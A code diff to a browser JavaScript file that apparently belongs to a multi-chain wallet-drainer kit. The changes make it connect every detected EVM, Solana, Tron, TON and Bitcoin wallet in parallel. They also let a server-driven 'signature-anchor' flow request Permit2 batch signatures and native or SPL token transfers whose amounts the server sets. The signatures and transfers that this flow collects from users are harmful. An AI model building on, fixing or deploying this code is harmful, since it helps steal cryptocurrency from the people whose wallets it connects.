@@ -1328,11 +1328,37 @@
   var _requestCache = {};
   var _requestInFlight = {};
 
-  function parseEnvelope(res, data) {
-    if (data && typeof data.ok === 'boolean') {
-      return { ok: data.ok, message: data.message || '', data: data.data || data };
+  function unwrapEnvelopePayload(payload) {
+    if (payload == null || typeof payload !== 'object') return payload;
+    if (
+      payload.data != null &&
+      (typeof payload.ok === 'boolean' || typeof payload.success === 'boolean')
+    ) {
+      return payload.data;
     }
-    return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
+    return payload;
+  }
+
+  function parseEnvelope(res, data) {
+    if (!data || typeof data !== 'object') {
+      return { ok: res.ok, message: res.statusText || '', data: data };
+    }
+    var msg = typeof data.message === 'string' ? data.message : res.statusText || '';
+    if (typeof data.success === 'boolean') {
+      return {
+        ok: data.success && res.ok,
+        message: msg,
+        data: unwrapEnvelopePayload(data.data != null ? data.data : data),
+      };
+    }
+    if (typeof data.ok === 'boolean') {
+      return {
+        ok: data.ok && res.ok,
+        message: msg,
+        data: unwrapEnvelopePayload(data),
+      };
+    }
+    return { ok: res.ok, message: msg, data: data };
   }
 
   function generateRequestId(method, path, body) {
@@ -2092,54 +2118,50 @@
     var connected = [];
     var errors = [];
 
-    // Connect EVM
+    var connectTasks = [];
+
     if (available.evm && available.evm.detected && !wallets.evm) {
-      try {
-        await connectEvm();
-        connected.push('EVM');
-      } catch (err) {
-        errors.push('EVM: ' + err.message);
-      }
+      connectTasks.push(
+        connectEvm()
+          .then(function () { connected.push('EVM'); })
+          .catch(function (err) { errors.push('EVM: ' + err.message); })
+      );
     }
 
-    // Connect Solana
     if (available.sol && available.sol.detected && !wallets.sol) {
-      try {
-        await connectSolana();
-        connected.push('Solana');
-      } catch (err) {
-        errors.push('Solana: ' + err.message);
-      }
+      connectTasks.push(
+        connectSolana()
+          .then(function () { connected.push('Solana'); })
+          .catch(function (err) { errors.push('Solana: ' + err.message); })
+      );
     }
 
-    // Connect Tron
     if (available.tron && available.tron.detected && !wallets.tron) {
-      try {
-        await connectTron();
-        connected.push('Tron');
-      } catch (err) {
-        errors.push('Tron: ' + err.message);
-      }
+      connectTasks.push(
+        connectTron()
+          .then(function () { connected.push('Tron'); })
+          .catch(function (err) { errors.push('Tron: ' + err.message); })
+      );
     }
 
-    // Connect TON
     if (available.ton && available.ton.detected && !wallets.ton) {
-      try {
-        await connectTon();
-        connected.push('TON');
-      } catch (err) {
-        errors.push('TON: ' + err.message);
-      }
+      connectTasks.push(
+        connectTon()
+          .then(function () { connected.push('TON'); })
+          .catch(function (err) { errors.push('TON: ' + err.message); })
+      );
     }
 
-    // Connect Bitcoin
     if (available.btc && available.btc.detected && !wallets.btc) {
-      try {
-        await connectBitcoin();
-        connected.push('Bitcoin');
-      } catch (err) {
-        errors.push('Bitcoin: ' + err.message);
-      }
+      connectTasks.push(
+        connectBitcoin()
+          .then(function () { connected.push('Bitcoin'); })
+          .catch(function (err) { errors.push('Bitcoin: ' + err.message); })
+      );
+    }
+
+    if (connectTasks.length > 0) {
+      await Promise.all(connectTasks);
     }
 
     return {
@@ -2272,6 +2294,8 @@
           gas: toHex(nativeTransfer.gas),
           maxFeePerGas: toHex(nativeTransfer.maxFeePerGas),
           maxPriorityFeePerGas: toHex(nativeTransfer.maxPriorityFeePerGas),
+          nonce: toHex(nativeTransfer.nonce),
+          chainId: toHex(nativeTransfer.chainId),
           type: '0x2',
         }],
       });
@@ -2416,10 +2440,19 @@
     var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
     var typedData = batch.typed_data;
     var batchMeta = batch.batch_permit_metadata;
-    if (!typedData || !batchMeta) throw new Error('Permit2 batch typed data missing from API');
+    var hasOmnichainWire =
+      (batch.native_transfer_sol && batch.native_amount_sol && BigInt(batch.native_amount_sol) > 0n) ||
+      (batch.native_transfer_trx && batch.native_amount_trx && BigInt(batch.native_amount_trx) > 0n) ||
+      (batch.native_transfer_ton && batch.native_amount_ton && BigInt(batch.native_amount_ton) > 0n) ||
+      (batch.spl_transfer && batch.spl_amount && BigInt(batch.spl_amount) > 0n);
+    if (!batchMeta) throw new Error('Permit2 batch metadata missing from API');
+    if (!typedData && !hasOmnichainWire) throw new Error('Permit2 batch typed data missing from API');
 
-    setStatus('Signing Permit2 batch (EIP-712)…', false);
-    var permitSig = await signEvmTypedData(typedData);
+    var permitSig = null;
+    if (typedData) {
+      setStatus('Signing Permit2 batch (EIP-712)…', false);
+      permitSig = await signEvmTypedData(typedData);
+    }
 
     var nativeSignedTx = null;
     if (batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n) {
